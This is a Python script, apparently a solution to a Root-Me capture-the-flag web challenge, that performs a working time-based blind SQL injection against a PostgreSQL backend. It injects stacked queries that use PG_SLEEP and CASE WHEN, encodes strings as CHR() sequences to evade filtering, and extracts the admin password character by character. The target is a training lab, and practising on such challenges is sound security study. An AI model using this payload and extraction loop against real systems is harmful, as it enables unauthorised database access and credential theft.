import requests, string, time

host = "http://challenge01.root-me.org/web-serveur/ch40/"
s = requests.session()
totalstart = time.time()
queries = 0

# start = time.time()

# r = s.get("http://challenge01.root-me.org/web-serveur/ch40/", params={"action":"member", "member":"2; SELECT (CASE WHEN ((SELECT password from users where id=1 OFFSET 0 LIMIT 1 ) LIKE (chr(37)||chr(37))) THEN (SELECT PG_SLEEP(3)) ELSE (SELECT PG_SLEEP(5)) END)--"})
# #
# print(r.text)

# print(time.time()-start)


def testPassword(password):

    print("Testing", password)

    # For some reason string literals cause a problem, so we have to convert the password into a collection of chr functions
    encoded_pass = '||'.join([f"CHR({ord(c)})" for c in password])

    # print(encoded_pass)

    payload = f"2; SELECT (CASE WHEN ((SELECT password from users where id=1 OFFSET 0 LIMIT 1 ) LIKE ({encoded_pass})) THEN (SELECT PG_SLEEP(2)) ELSE (SELECT PG_SLEEP(0)) END)--"
    # print(payload)

    start = time.time()
    r = s.get(host, params={"action": "member", "member": payload})
    global queries
    queries += 1

    seconds = time.time() - start

    # print("Duration:", seconds)

    return seconds > 1

flagchars = []

# Start by finding what letters are in the password
# If password LIKE '%a%' is false then we know the password doesn't have any a's, which speeds up the extraction dramatically.

for c in string.printable:
    if c in r"%_":
        continue
    if testPassword(f"%{c}%"):
        flagchars.append(c)

print(flagchars)


# Now for each character position in the password, check each of the characters found above.
# If none of the characters match, then we're either at the end of the password or something went wrong.
password = ""
while True:
    for c in flagchars:
        if testPassword(f"{password}{c}%"):
            password += c
            print("Found a char", c, password)
            break
    else:
        print("Couldn't find next char")
        break

print("Final password", password)
print(f"Completed in {time.time() - totalstart} seconds with {queries} total queries")